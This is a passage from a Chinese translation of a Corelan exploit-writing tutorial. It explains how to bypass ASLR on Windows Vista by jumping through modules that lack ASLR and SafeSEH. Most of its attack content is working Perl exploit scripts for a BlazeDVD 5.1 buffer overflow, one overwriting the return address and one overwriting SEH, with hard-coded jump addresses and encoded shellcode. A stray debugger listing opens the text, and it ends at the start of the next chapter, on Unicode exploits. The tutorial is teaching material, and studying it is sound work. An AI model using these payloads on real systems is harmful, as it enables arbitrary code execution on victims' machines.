011E10BC CC INT3
011E10BD CC INT3
011E10BE CC INT3
011E10BF CC INT3
011E10C0 /$ 55 PUSH EBP
011E10C1 |. 8BEC MOV EBP,ESP
011E10C3 |. B8 141D0000 MOV EAX,1D14
011E10C8 |. E8 230A0000 CALL vulnsrv.011E1AF0
011E10CD |. A0 1521CD00 MOV AL,BYTE PTR DS:[CD2115]
011E10D2 |. 8885 F0E2FFFF MOV BYTE PTR SS:[EBP-1D10],AL
011E10D8 |. 68 87130000 PUSH 1387 ; /n = 1387 (4999.)
011E10DD |. 6A 00 PUSH 0 ; |c = 00
011E10DF |. 8D8D F1E2FFFF LEA ECX,DWORD PTR SS:[EBP-1D0F] ; |
011E10E5 |. 51 PUSH ECX ; |s
011E10E6 |. E8 FF090000 CALL  ; \memset
011E10EB |. 83C4 0C ADD ESP,0C
011E10EE |. 8A15 1621CD00 MOV DL,BYTE PTR DS:[CD2116]
011E10F4 |. 8895 78F6FFFF MOV BYTE PTR SS:[EBP-988],DL
011E10FA |. 68 CF070000 PUSH 7CF ; /n = 7CF (1999.)
011E10FF |. 6A 00 PUSH 0 ; |c = 00
绕过ASLR:利用没启用ASLR模块中的地址
另外一个技术就是利用没使用随机基址的模块中的地址，这个方法和绕过SafeSEH中的一个方法类似：利
用没有启用SafeSEH模块中的地址来（在这里换成了 ASLR）绕过。我知道一些人认为这不是真正意义上
的“绕过”..但是 呵--它的确工作的很好。
在一定情况下（事实上在大多情况下），执行映像（或一些加载模块）没有启用ASLR保护，这意味着你
完全可以使用EXE或DLL中的跳转地址来跳到shellcode。
因为这些地址极可能不是随机的，在EXE模块的地址中一般包含一个NULL字节，这意味着即使你找到了
一个能跳到shellcode的跳转指令的地址，你仍然需要解决NULL字节带来的问题，这是否是个难题取决
于溢出发生时的堆栈布局和寄存器的状态。
让我们看下2009年8月的一个漏洞 http://www.milw0rm.com/exploits/9329。这个 POC 展示是BlazeDVD
5.1 Professional中的一个缓冲区溢出漏洞。当打开恶意的 plf文件就会触发这个漏洞，这个漏洞可以
利用覆盖SEH的方式进行攻击。
你可以在这里下载：
BlazeDVD 5.1 Professional（登录后才能下载）
现在我们看下我们能否在Vista上为这个漏洞开发出稳定的exploit。
首先我们先确定下覆盖多远才能覆盖到SEH结构，通过一些简单测试，我们发现在608字节后我们可以覆
盖到SEH结构:
my $sploitfile="blazesploit.plf";
print "[+] Preparing payload\n";
my $junk = "A" x 608;
$junk = $junk."BBBBCCCC";
$payload =$junk;
print "[+] Writing exploit file $sploitfile\n";
open ($FILE,">$sploitfile");
print $FILE $payload;
close($FILE);
print "[+] ".length($payload)." bytes written to file\n";
看起来我们有两种方法来攻击这个漏洞：直接覆盖返回地址(EIP=41414141)或覆盖SEH（ SEH chain : SE
Handler = 43434343 (next SEH = 42424242))。Esp指向我们的缓冲区。
我们用!ASLRdynamicbase命令来看下ASLR的启用情况，见下图：
哇噢，看起来有很多模块没有启用ASLR保护，这意味着我们可以使用这些模块中的跳转指令来实现跳转，
不幸的是，脚本ASLRdynamicbase的输出结果并不可靠，记录下没启用 ASLR模块的基址，然后重启系统，
再运行这个脚本，并跟上次的记录做比较，这可以给我们一个更准确的结果，在这种情况下，从23个减
少到7个（这样依然不坏，不是吗？）。
BlazeDVD.exe (0×00400000), skinscrollbar.dll (0×10000000), configuration.dll
(0×60300000), epg.dll (0×61600000) , mediaplayerctrl.dll (0×64000000) , netreg.dll
(0×64100000) , versioninfo.dll (0×67000000)
绕过AAAASSSSLLLLRRRR（直接覆盖返回地址）
用这种方式，我们可以在260字节后覆盖到EIP，然后一个jmp esp（call esp 或 push esp/ret）就可
以搞定它。
可用的跳转地址：
* blazedvd.exe : 79 addresses (but null bytes !)
* skinscrollbar.dll : 0 addresses
* configuration.dll : 2 addresses, no null bytes
* epg.dll : 20 addresses, no null bytes
* mediaplayerctrl.dll : 15 addresses, 8 with null bytes
* netreg.dll : 3 addresses, no null bytes
* versioninfo.dll : 0 addresses
在260个字符后，返回地址被覆盖，下边是一个比较稳定的exploit：
my $sploitfile="blazesploit.plf";
print "[+] Preparing payload\n";
my $junk = "A" x 260;
my $ret = pack('V',0x6033b533); #jmp esp from configuration.dll
my $nops = "\x90" x 30;
# windows/exec - 302 bytes
# http://www.metasploit.com
# Encoder: x86/alpha_upper
# EXITFUNC=seh, CMD=calc
my $shellcode="\x89\xe3\xdb\xc2\xd9\x73\xf4\x59\x49\x49\x49\x49\x49\x43" .
"\x43\x43\x43\x43\x43\x51\x5a\x56\x54\x58\x33\x30\x56\x58" .
"\x34\x41\x50\x30\x41\x33\x48\x48\x30\x41\x30\x30\x41\x42" .
"\x41\x41\x42\x54\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30" .
"\x42\x42\x58\x50\x38\x41\x43\x4a\x4a\x49\x4b\x4c\x4b\x58" .
"\x51\x54\x43\x30\x45\x50\x45\x50\x4c\x4b\x47\x35\x47\x4c" .
"\x4c\x4b\x43\x4c\x43\x35\x44\x38\x43\x31\x4a\x4f\x4c\x4b" .
"\x50\x4f\x44\x58\x4c\x4b\x51\x4f\x47\x50\x45\x51\x4a\x4b" .
"\x50\x49\x4c\x4b\x46\x54\x4c\x4b\x45\x51\x4a\x4e\x50\x31" .
"\x49\x50\x4c\x59\x4e\x4c\x4c\x44\x49\x50\x44\x34\x45\x57" .
"\x49\x51\x49\x5a\x44\x4d\x43\x31\x49\x52\x4a\x4b\x4b\x44" .
"\x47\x4b\x50\x54\x47\x54\x45\x54\x43\x45\x4a\x45\x4c\x4b" .
"\x51\x4f\x46\x44\x45\x51\x4a\x4b\x45\x36\x4c\x4b\x44\x4c" .
"\x50\x4b\x4c\x4b\x51\x4f\x45\x4c\x43\x31\x4a\x4b\x4c\x4b" .
"\x45\x4c\x4c\x4b\x43\x31\x4a\x4b\x4d\x59\x51\x4c\x46\x44" .
"\x43\x34\x49\x53\x51\x4f\x46\x51\x4b\x46\x43\x50\x46\x36" .
"\x45\x34\x4c\x4b\x50\x46\x50\x30\x4c\x4b\x51\x50\x44\x4c" .
"\x4c\x4b\x42\x50\x45\x4c\x4e\x4d\x4c\x4b\x42\x48\x43\x38" .
"\x4b\x39\x4a\x58\x4d\x53\x49\x50\x43\x5a\x50\x50\x43\x58" .
"\x4c\x30\x4d\x5a\x45\x54\x51\x4f\x42\x48\x4d\x48\x4b\x4e" .
"\x4d\x5a\x44\x4e\x50\x57\x4b\x4f\x4b\x57\x43\x53\x43\x51" .
"\x42\x4c\x43\x53\x43\x30\x41\x41";
$payload =$junk.$ret.$nops.$shellcode;
print "[+] Writing exploit file $sploitfile\n";
open ($FILE,">$sploitfile");
print $FILE $payload;
close($FILE);
print "[+] ".length($payload)." bytes written to file\n";
重启系统，再触发它… 它仍然会工作的很好。
绕过AAAASSSSLLLLRRRR:::: 基于SSSSEEEEHHHH 的eeeexxxxppppllllooooiiiitttt
下边介绍基于SEH的exploit，基本的技术是相同的，找到不受 ASLR保护的模块，再找到你所需要的跳
板地址，我们假设exploit也需要绕过SafeSEH。
没有开启safeseh保护的模块(!pvefindaddr nosafeseh)：
Safeseh和ASLR都没启用的模块：
如果我们可以在这些模块中找到一个可用的地址，我们还要去再试一次，因为输出并不完全可信，为了确
认，你需要重启系统并比较两次的输出，safeseh和ASLR都没启用的模块有：
* skinscrollbar.dll (0×10000000)
* configuration.dll (0×60300000)
* epg.dll (0×61600000)
* mediaplayerctrl.dll (0×64000000)
* netreg.dll (0×64100000)
* versioninfo.dll (0×67000000)
从这些模块中找到一组pop/pop/ret(或者一个jmp/call dword[reg+nn]也可以)。
可以工作的 exploit：（seh 在 608 字节后被覆盖，我们使用 skinscrollbar.dll中的跳板指令（pop
/pop/ret））
my $sploitfile="blazesploit.plf";
print "[+] Preparing payload\n";
my $junk = "A" x 608;
my $nseh = "\xeb\x18\x90\x90";
my $seh = pack('V',0x100101e7); #p esi/p ecx/ret from skinscrollbar.dll
my $nop = "\x90" x 30;
# windows/exec - 302 bytes
# http://www.metasploit.com
# Encoder: x86/alpha_upper
# EXITFUNC=seh, CMD=calc
my $shellcode="\x89\xe3\xdb\xc2\xd9\x73\xf4\x59\x49\x49\x49\x49\x49\x43" .
"\x43\x43\x43\x43\x43\x51\x5a\x56\x54\x58\x33\x30\x56\x58" .
"\x34\x41\x50\x30\x41\x33\x48\x48\x30\x41\x30\x30\x41\x42" .
"\x41\x41\x42\x54\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30" .
"\x42\x42\x58\x50\x38\x41\x43\x4a\x4a\x49\x4b\x4c\x4b\x58" .
"\x51\x54\x43\x30\x45\x50\x45\x50\x4c\x4b\x47\x35\x47\x4c" .
"\x4c\x4b\x43\x4c\x43\x35\x44\x38\x43\x31\x4a\x4f\x4c\x4b" .
"\x50\x4f\x44\x58\x4c\x4b\x51\x4f\x47\x50\x45\x51\x4a\x4b" .
"\x50\x49\x4c\x4b\x46\x54\x4c\x4b\x45\x51\x4a\x4e\x50\x31" .
"\x49\x50\x4c\x59\x4e\x4c\x4c\x44\x49\x50\x44\x34\x45\x57" .
"\x49\x51\x49\x5a\x44\x4d\x43\x31\x49\x52\x4a\x4b\x4b\x44" .
"\x47\x4b\x50\x54\x47\x54\x45\x54\x43\x45\x4a\x45\x4c\x4b" .
"\x51\x4f\x46\x44\x45\x51\x4a\x4b\x45\x36\x4c\x4b\x44\x4c" .
"\x50\x4b\x4c\x4b\x51\x4f\x45\x4c\x43\x31\x4a\x4b\x4c\x4b" .
"\x45\x4c\x4c\x4b\x43\x31\x4a\x4b\x4d\x59\x51\x4c\x46\x44" .
"\x43\x34\x49\x53\x51\x4f\x46\x51\x4b\x46\x43\x50\x46\x36" .
"\x45\x34\x4c\x4b\x50\x46\x50\x30\x4c\x4b\x51\x50\x44\x4c" .
"\x4c\x4b\x42\x50\x45\x4c\x4e\x4d\x4c\x4b\x42\x48\x43\x38" .
"\x4b\x39\x4a\x58\x4d\x53\x49\x50\x43\x5a\x50\x50\x43\x58" .
"\x4c\x30\x4d\x5a\x45\x54\x51\x4f\x42\x48\x4d\x48\x4b\x4e" .
"\x4d\x5a\x44\x4e\x50\x57\x4b\x4f\x4b\x57\x43\x53\x43\x51" .
"\x42\x4c\x43\x53\x43\x30\x41\x41";
$payload =$junk.$nseh.$seh.$nop.$shellcode;
print "[+] Writing exploit file $sploitfile\n";
open ($FILE,">$sploitfile");
print $FILE $payload;
close($FILE);
print "[+] ".length($payload)." bytes written to file\n";
ASLR and DEP
对ANI漏洞的利用证明了同时成功绕过DEP和ASLR的可能。这个漏洞代码由于处于异常处理器的保护之
下，在被攻击后并不会崩溃,因此我们可以尝试打开大量的ANI文件，通过这种暴力的方式，我们总会在
ntdll.dll（受ASLR保护）中找到那段用于关闭DEP的代码。
Questions ? Comments ?
Feel free to post your questions, comments, feedback, etc at the forum :
http://www.corelan.be:8800/index.php/forum/writing-exploits/
Exploit编写系列教程第七篇：编写 Unicode Exploit
作者：Peter Van Eeckhoutte
译者：riusksk（泉哥：http://riusksk.blogbus.com）
笔者花了两三周的时间来写这篇教程，很高兴可以发布本系列教程的下一篇文章了。你可能（或许没有）
遭遇到这样一种情况：在执行缓冲区溢出攻击时，直接覆写掉RET或SEH，但在EIP上看到的不是0x41414141，
而是0x00410041。有时将一些数据用于函数调用，用它来执行某项操作，但这些数据有时又会被转换成大写的，
或小写的等等……在有些时候，数据又被转换成unicode。当你在EIP上看到0x00410041时，多数意味着paload
入栈前被转换成 unicode 了。在很长一段时间里面，人们认为这种覆写类型是无法利用的，只能用于 DoS，而
不能执行任意代码。
2002年，Chris Anley写了一篇论文（http://www.ngssoftware.com/papers/unicodebo.pdf）证明这种想法是错
误的，既此“Venetian Shellcode”一词诞生了！
2003 年 1 月 ， 著 名 黑 客 杂 志 《 Phrack 》 上 由 obscou 写 的 一 篇 文 章 发 布 了
（http://www.phrack.org/issues.html?issue=61&amp;id=11%23article），他在文章中演示了利用上述理论写出可用
shellcode的技术。一个月之后，Dave Aitel发布一自动完成此过程的脚本。
2004年，FX发布一种优化此技术的新脚本。
不久之后，SkyLined发布了它著名的alpha2编码器，这工具可以帮助你生成unicode shellcode。在下文中
我们会讨论到这些技术和工具。
2009年，就是我的这篇教程了。这里没有包含任何新的技术，但在本文中详细解释了整个实现过程。
为了通过0x00410041构建可用的exploit，在此之前我们需要先解释一些东西。比如什么是unicode，为什
么数据要被转换成unicode，转换过程如何发生的，什么因素影响着转换过程，以及如何转换才能构造出可用的
exploit。
何为unicode以及为何开发人员要将数据转换成unicode?
Wikipedia上解释到：“在计算机科学领域中，Unicode（统一码、万国码、单一码、标准万国码）是业界的